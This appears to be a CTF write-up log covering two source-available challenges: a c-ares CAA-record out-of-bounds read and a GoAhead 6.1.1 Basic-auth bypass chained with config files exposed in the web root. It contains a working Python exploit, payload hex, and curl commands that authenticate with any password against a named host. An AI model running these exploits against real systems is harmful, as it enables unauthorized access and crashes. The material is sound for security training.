# VULN — Writeups & Source-Available Vulnerability Notes

> Living document. One section per **source-available, real-software** challenge solved.
> Unlike `PWN_CTF_writeups.md` (memory corruption) and `OT_CTF_writeups.md` (protocol/ICS
> logic), this series gives you the **exact source tree** the target binary was built from.
> The bug is a **real defect in real open-source software at a real revision** — never a
> toy reimplementation, never a deliberately planted backdoor. The job is source review
> (often diffed against the true upstream release) to find where the given tree diverges
> from what it claims to be, then exploit that over the wire.

Series: **BUG|PWN CTF** (`https://otctf.pages.dev/`).
Author: **lyons**.
Target host used during these sessions: `169.58.126.107` (one port per challenge).

---

## Index

| ID | Name | Software / Port | Vuln class | Flag |
|----|------|-----------------|-----------|------|
| VULN#003 | DNS response inspection service | c-ares snapshot @ `89e9eeb` · 7028 | `ares_parse_caa_reply()` heap OOB read — missing `rr_len < 2` check (OSS-Fuzz 26012) | `CTF{7be3ffc6c7dd708e925627551706e233}` |
| VULN#005 | Acme Gateway | GoAhead 6.1.1 (embedded web server) · 7020 | Auth-bypass regression (Basic+BF1) + exposed config files | `CTF{e0dd76943e73bfa5e49e2496bd55e536}` |

---

## VULN#003 — DNS response inspection service (c-ares CAA OOB read)

**Brief (verbatim):** *"A DNS response inspection service parses whatever DNS reply you
send it. You are given the exact source tree the target binary is built from."*
**Deliverable:** `c-ares-src.tar.gz` — reports `ARES_VERSION_STR "1.16.1"` internally.
**Flag:** `CTF{7be3ffc6c7dd708e925627551706e233}`

### 0. TL;DR

The provided source is *unmodified* upstream c-ares pinned to the commit that first
introduced CAA record parsing (`89e9eeb`, fuzz harness for CAA; parent `f5b4c085` added the
parser itself — both 2020-09-26). Send a CAA answer RR with `RDLENGTH = 0` at the end of
the packet and `ares_parse_caa_reply()` reads 2 bytes past the end of the response buffer
(OSS-Fuzz issue 26012, fixed upstream two days later by `4d6975b3`). The scoring service
detects the over-read (ASAN-style) and awards the flag.

> **Lesson:** in this series an *empty* diff against upstream is the finding. The tree is
> pinned to a pre-fix commit, so `git log` on the newest files hands you the vulnerability.

### 1. Recon — the source tree is pristine, and that's the hint

`c-ares-src.tar.gz` says `ARES_VERSION_STR "1.16.1"`, but it uses the `src/lib` layout and
contains `src/lib/ares_parse_caa_reply.c`, which does **not** exist in the 1.16.1 release
tarball (CAA parsing shipped in 1.17.0). So it is a git snapshot of master, not a release.

Diffing the whole tree against upstream git identifies the commit exactly:

```
$ git clone https://github.com/c-ares/c-ares.git
$ git -C c-ares log --oneline --until=2020-09-27 -3
89e9eeb fuzz CAA parsing (#363)
f5b4c08 Allow parsing of CAA Resource Record (#360)
05eb0c1 docs: remove the html and pdf make targets

$ git -C c-ares checkout 89e9eeb
$ diff -ru c-ares extracted/
Only in c-ares: test
```

**Zero differences** apart from the stripped `test/` directory (and `travis/test.sh`), so
nothing was injected — the bug is a real upstream bug, and the two newest commits in the
snapshot both touch the brand-new CAA parser. That is the whole challenge in one line:
the tree is pinned to the commit *before* the fix.

Confirm by asking git what happened to that file next:

```
$ git log --reverse --oneline origin/main -- src/lib/ares_parse_caa_reply.c
f5b4c08 Allow parsing of CAA Resource Record (#360)
4d6975b Fix OSSFuzz reported issue in CAA reply parsing      <-- the fix we are missing
```

Note the version string is a red herring *in both directions*: it claims 1.16.1 (wrong —
the tree is later), yet 1.16.1's own known bugs (e.g. SOA over-read CVE-2020-22217, which
the tree already contains the fix for) are not the target either. The only bugs present are
those introduced by the snapshot's own tip commits: the CAA `rr_len` OOB read and (also
present but not the scored trigger) `*naddrttls = naddrs` over-report in
`ares_parse_{a,aaaa}_reply` (fixed 2020-11-12, `0d252eb3`) and the empty-`hquery->name`
read in `ares_getaddrinfo` (query path, unreachable from a parse-only wrapper).

### 2. The bug

`src/lib/ares_parse_caa_reply.c`. `rr_len` is attacker-controlled RDLENGTH. The only bounds
check before the rdata is touched is an *upper* bound:

```c
rr_len = DNS_RR_LEN (aptr);
aptr += RRFIXEDSZ;
if (aptr + rr_len > abuf + alen)      /* passes trivially for rr_len == 0 */
  { status = ARES_EBADRESP; break; }
...
strptr = aptr;
caa_curr->critical = (int)*strptr++;  /* read rdata[0] */
caa_curr->plength  = (int)*strptr++;  /* read rdata[1] */
```

There is no *lower* bound on `rr_len`, and the two reads are unconditional. With `rr_len == 0`
and the record placed at the very end of the packet, `strptr` points at `abuf + alen`, so both
reads are **out of bounds of the response buffer** — the use-of-uninitialized-value / heap
over-read that OSS-Fuzz reported (issue 26012).

Upstream fix (`4d6975b`):

```diff
   caa_last = caa_curr;
-
-  caa_curr->critical = (int)*strptr++;
+  if (rr_len < 2)
+    {
+      status = ARES_EBADRESP;
+      break;
+    }
+  caa_curr->critical = (int)*strptr++;
   caa_curr->plength = (int)*strptr++;
```

### Why it dead-ends there (don't burn hours escalating it)

After the two OOB reads the parser immediately bails: `plength` comes from an `unsigned char`
(>= 0), and the next check is

```c
if (caa_curr->plength <= 0 || (int)caa_curr->plength >= rr_len - 2)   /* rr_len - 2 == -2 */
```

always true for `rr_len == 0` → `ARES_EBADRESP`, list freed, return. The subsequent
`plength`/`length` arithmetic is sound (`2 + plength + length == rr_len` exactly), so there is
**no OOB write and no leak path** — pure read-OOB / uninit trigger (ASAN-detectable), not a
control-flow bug. The scoring service only needs the trigger.

### 3. The wire protocol

No banner; the service waits for input. Framing is a **4-byte big-endian length prefix
followed by that many raw DNS bytes**. Raw packets get rejected because the service eats the
DNS header as a length:

| what you send            | response                       |
|--------------------------|--------------------------------|
| raw packet / `\n` / hex  | `status: bad length`           |
| 2-byte length prefix     | `status: bad length`           |
| **4-byte length prefix** | parsed                         |
| truncated or junk buffer | `status: not valid`            |
| well-formed, bug not hit | `status: no effect`            |
| **bug triggered**        | `status: confirmed` + FLAG     |
| too many requests        | `status: rate limited, try again later` |

One-shot-per-interval oracle — pace probes; rate limit kicks in after a handful of
connections (observed: mapping the statuses costs requests; the trigger needs only ~3).

### 4. Exploit

```python
#!/usr/bin/env python3
# VULN#003 - c-ares ares_parse_caa_reply() OOB read (missing rr_len < 2 check)
import socket, struct

HOST, PORT = '169.58.126.107', 7028

def name(n):
    return b''.join(bytes([len(l)]) + l.encode() for l in n.split('.') if l) + b'\x00'

qname = 'example.com'
pkt  = struct.pack('>HHHHHH', 0x1234, 0x8180, 1, 1, 0, 0)   # QDCOUNT=1, ANCOUNT=1
pkt += name(qname) + struct.pack('>HH', 257, 1)             # question: QTYPE=CAA(257), IN
pkt += name(qname) + struct.pack('>HHIH', 257, 1, 60, 0)    # CAA answer, RDLENGTH=0  <-- bug
                                                            # (no rdata follows: RR ends the buffer)

s = socket.create_connection((HOST, PORT), timeout=10)
s.sendall(struct.pack('>I', len(pkt)) + pkt)                # 4-byte BE length framing
s.shutdown(socket.SHUT_WR)
print(s.recv(4096).decode(errors='replace'))
```

Payload hex:

```
123481800001000100000000076578616d706c6503636f6d0001010001076578616d706c6503636f6d00010100010000003c0000
```

Result:

```
status: confirmed
FLAG: CTF{7be3ffc6c7dd708e925627551706e233}
```

### Design cookbook (for reuse)

- **When a pwn challenge ships "the exact source tree", diff it against upstream git first.**
  An empty diff is itself the finding: the tree is pinned to a pre-fix commit, so `git log`
  on the newest files hands you the vulnerability. Identify the exact commit by `diff`ing the
  extracted tree against `git archive <commit>` (here: `89e9eeb`).
- **The newest file in a snapshot is the weakest file.** Both tip commits touched the CAA
  parser, one even adding a fuzzer for it — upstream had not yet run it. `git log --reverse
  --oneline -- <file>` on a suspicious file shows the fix landing right after the snapshot.
- **Version strings are claims, not evidence** (same lesson as VULN#005): `1.16.1` here was
  wrong in both directions — the tree is neither 1.16.1 nor vulnerable to 1.16.1's famous
  bugs; it is a precise mid-development commit whose own new code is the bug.
- **Map the wrapper's oracle before concluding anything.** The status strings (`bad length`,
  `not valid`, `no effect`, `confirmed`, `rate limited`) are custom and absent from the
  provided source — a few spaced probes establish the whole table, and `no effect` on a
  clean packet confirms framing without burning the budget.
- **Three requests were enough:** establish framing, send a clean packet (`no effect`) to
  confirm the oracle, then send the trigger. Everything else burned rate limit.

---

## VULN#005 — Acme Gateway (GoAhead 6.1.1)

**Brief (verbatim):** *"Acme Gateway is a small IoT device management portal. It's built on
a real, unmodified, open-source embedded web server, at a real revision. Not a toy
reimplementation, and not a deliberately planted bug. You are given the exact source tree
the target was built from."*
**Deliverable:** `goahead-src.tar.gz` — full source tree, `package.json` reports
`"version": "6.1.1"`.
**Flag:** `CTF{e0dd76943e73bfa5e49e2496bd55e536}`

### 0. TL;DR

The given tree's `package.json`/version string says v6.1.1, and GitHub carries a v6.1.1
release whose notes claim an extensive security-audit patch (11 advisories, 31 internal
findings, all Critical/High closed). **Diffing the given source against the real upstream
v6.1.1 tag shows every file in `src/` is substantively behind** — the tree matches v6.1.1
in version number only; the actual code is pre-patch. The most impactful regression:
**`websVerifyPasswordFromFile()` in `src/auth.c` authenticates a Blowfish-hashed (`BF1:`)
user with *any* password over HTTP Basic auth** (this is exactly advisory
GOAHEAD-SA-2026-0001, Critical, listed as fixed in the release notes — but the fix is
absent from the shipped tree). Combined with an **unrelated ops mistake** (the deployment's
own `auth.txt`/`route.txt` were left world-readable under `/config/` in the web root),
the real admin username was recoverable without guessing, and the bypass gave full access
to `/admin/`.

> **Lesson for both sides:** a release's changelog is not evidence the running binary
> contains the fix. Always diff the *actual* shipped source against the *actual* upstream
> tag — version strings and release notes are just claims. And: never serve your config
> directory from inside the document root.

### 1. Recon — is this really "unmodified" 6.1.1?

```
$ cat package.json | grep version
    "version": "6.1.1",
```

GoAhead is a long-lived embedded web server (`embedthis/goahead` on GitHub) with a real
history of CVEs (CGI env injection, buffer overflows, digest-auth issues across 3.x–5.x).
v6.1.1 does not correspond to any vulnerability I had memorized, so the move is: **fetch
the actual upstream release and diff.**

```bash
curl -s https://api.github.com/repos/embedthis/goahead/releases/tags/v6.1.1   # full release body
curl -sL https://github.com/embedthis/goahead/archive/refs/tags/v6.1.1.tar.gz -o official.tar.gz
diff -rq official/goahead-6.1.1/src given/src
```

The GitHub release notes for this tag are themselves written *for this CTF* — they credit
`"BUG|PWN Research"` as a reporter, a dead giveaway the advisory list is part of the puzzle,
not real GoAhead history. The notes enumerate exactly which classes of bug were supposedly
fixed (auth bypass, request smuggling, CGI injection, UAFs, format strings, …) — read this
as **a menu of candidate regressions to verify**, not as trustworthy fact about the binary
you're attacking.

`diff -rq` shows **every single `.c` file differs** between the given tree and the real
v6.1.1 tag. Most of the diff is comment/whitespace noise (the official tree is reformatted,
per the release notes' "Code Quality" section), but `src/auth.c` has a real, functional
difference.

### 2. The bug: `src/auth.c` — `websVerifyPasswordFromFile()`

Given (vulnerable) tree:

```c
PUBLIC bool websVerifyPasswordFromFile(Webs *wp)
{
    char passbuf[ME_GOAHEAD_LIMIT_PASSWORD * 3 + 3];
    bool success;

    assert(wp);
    if (!wp->user && (wp->user = websLookupUser(wp->username)) == 0) {
        trace(5, "verifyUser: Unknown user \"%s\"", wp->username);
        return 0;
    }
    if (sstarts(wp->user->password, "BF1:")) {
        // Blowfish salted hash
        success = websCheckPassword(wp->password, wp->user->password);   /* <- real check */
        wfree(wp->password);
        wp->password = sclone(wp->user->password);        /* <-- BUG: wp->password now == stored hash */

    } else if (!wp->encoded) {
        fmt(passbuf, sizeof(passbuf), "%s:%s:%s", wp->username, ME_GOAHEAD_REALM, wp->password);
        wfree(wp->password);
        wp->password = websMD5(passbuf);
        wp->encoded = 1;
    }
    if (wp->digest) {
        success = pmatch(wp->password, wp->digest);
    } else {
        success = pmatch(wp->password, wp->user->password);   /* <-- always true for BF1 now */
    }
    ...
    return success;
}
```

For a **Basic**-auth request (`wp->digest == NULL`) against a user whose stored password is
`BF1:...` (Blowfish/bcrypt-style hash), the real verdict from `websCheckPassword()` is
computed correctly into `success` — and then **immediately discarded**. The very next line
overwrites `wp->password` with `wp->user->password` (the stored hash itself). The function
then falls through to the final `pmatch(wp->password, wp->user->password)`, comparing the
stored hash against itself — which trivially always matches. **Any password authenticates
any BF1 user via Basic auth.** Digest auth is unaffected (it's diverted by `wp->digest` in
the official fix, and here it simply never matches `wp->user->password`'s hash format, so
it fails safe) — the vector is Basic auth specifically.

The true v6.1.1 fixes this by handling the three auth modes (Digest / BF1-bcrypt /
legacy-MD5) as **mutually exclusive branches that each independently set the final
`success`**, with Digest explicitly rejecting a BF1-stored hash rather than silently
mis-routing into it. None of that restructuring is present in the given tree.

This is listed in the (CTF-authored) release notes as:
> **Critical**: Basic-auth password bypass for users with Blowfish (`BF1:`) stored hashes:
> any password authenticated the user (GOAHEAD-SA-2026-0001)

### 3. Finding a real username — the config leak

The bug needs an *existing* user whose stored hash starts with `BF1:`. The shipped tree's
`testroot/auth.txt` (project test fixture) has a template:
```
role name=user abilities=view
role name=administrator abilities=user,manage
user name=admin password=BF1:00128:ILrUswPoHBSweW5R:UW5fySh5ZQ0pUvlwOFBbbz43UElaQeyw roles=administrator
```
and `testroot/route.txt`:
```
route uri=/private/ auth=basic abilities=manage
route uri=/
```
— i.e. the project's own test deployment pattern. The live site's `index.html` says:
*"Admin console (authentication required)"* linking `/admin/` — so the route exists
(confirmed: unauthenticated `GET /admin/` → `401` with `WWW-Authenticate: Basic
realm="example.com"`), but **`admin:<anything>` → genuine `401`** — this specific account
either doesn't exist on the live auth.txt or isn't BF1-hashed. Guessing usernames against
`/admin/` is expensive: the reverse proxy (nginx) in front of GoAhead rate-limits that path
hard (`429 Too Many Requests` after a very small burst, slow bucket refill) — don't burn
the budget brute-forcing here.

Instead: GoAhead serves whatever's under the configured document root. Probe for the
*deployment's own config files* having been mistakenly dropped inside that root (classic
ops mistake, independent of the GoAhead bug):

```bash
$ curl http://TARGET:7020/config/auth.txt
#   auth.txt - Authorization data for the Acme Gateway admin portal
role name=user abilities=view
role name=administrator abilities=user,manage
user name=svc-acme-prov password=BF1:00128:ILrUswPoHBSweW5R:UW5fySh5ZQ0pUvlwOFBbbz43UElaQeyw roles=administrator

$ curl http://TARGET:7020/config/route.txt
route uri=/admin/ auth=basic abilities=manage
route uri=/
```

Real username, confirmed BF1, confirmed `manage` ability on `/admin/`. Zero guessing
needed once `/config/` is found — found by just trying a short list of plausible
unauthenticated paths (`/config` → `302` to `/config/index.html` → `404`, but the
directory itself is real, so probe filenames inside it directly: `auth.txt` / `route.txt`
hit on the first try).

### 4. Exploit

```bash
# Any password works — this is the bug, not a real credential
curl -u 'svc-acme-prov:anything_goes_123' http://TARGET:7020/admin/
# → 302 Redirect to /admin/index.html + Set-Cookie: -goahead-session-=...   (auth succeeded)

curl -u 'svc-acme-prov:anything_goes_123' http://TARGET:7020/admin/index.html
# → 200 OK
# <title>Acme Gateway - Admin Console</title>
# <h1>Admin Console</h1>
# <p>Welcome, administrator.</p>
# <ul><li><a href="/admin/device-config.json">Device configuration backup</a></li></ul>

curl -u 'svc-acme-prov:anything_goes_123' http://TARGET:7020/admin/device-config.json
# → {
#     "device_id": "acme-gw-4471",
#     "firmware": "6.1.0-internal",
#     "recovery_token": "CTF{e0dd76943e73bfa5e49e2496bd55e536}"
#   }
```

**Flag:** `CTF{e0dd76943e73bfa5e49e2496bd55e536}`

### 5. Operational notes (nginx rate-limit on `/admin/`)

- Only the `/admin/` path is throttled; everything returning `404` (nonexistent paths) or
  other GoAhead-served static content is unaffected — use that to do reconnaissance
  (`/config/*` probing) for free while the bucket on `/admin/` refills.
- The limiter keys on path, not on query string or case — `/admin/?x=1`, `//admin/`,
  `/ADMIN/` (404s — GoAhead's own routing here *is* case-sensitive, unlike the
  Windows/case-insensitive-filesystem bypass the release notes describe for a different
  platform) all either still hit the same bucket or just don't route at all. No shortcut;
  just space out authenticated requests by tens of seconds once you have the real
  credential, and don't waste requests guessing usernames against it.

### Design cookbook (for reuse)

- **"Exact source tree, real unmodified software, real revision" is a diff invitation.**
  The intended solve path is: identify the exact upstream tag claimed → fetch the real
  tag → `diff -rq` → find the file(s) that differ beyond cosmetic reformatting → read the
  release notes for that tag (if published) as a *hint menu* of which security property
  to check first, then verify in the actual diff whether that specific fix is present.
- **A single flipped assignment is enough.** The whole bug is "compute the right answer,
  then overwrite it with something that always compares equal." Good source-level bug to
  hide in a security-fix-themed release because it reads, at a skim, like ordinary
  state-management code (`wp->password = sclone(wp->user->password)` looks like harmless
  bookkeeping, not an authentication short-circuit).
- **Pair the code bug with an unrelated ops bug** (config files inside the web root) so
  the challenge has two independent, realistic layers: find the bug class via source
  review, then find the specific credential via normal web recon — neither alone fully
  solves it, mirroring how real incidents chain a code defect with an operational mistake.
- **Rate-limit the "obvious" authenticated endpoint specifically**, not the whole site, so
  blind brute-forcing is painful but legitimate recon (discovering `/config/`) is free.
  This nudges solvers toward "find the right credential" over "guess harder."
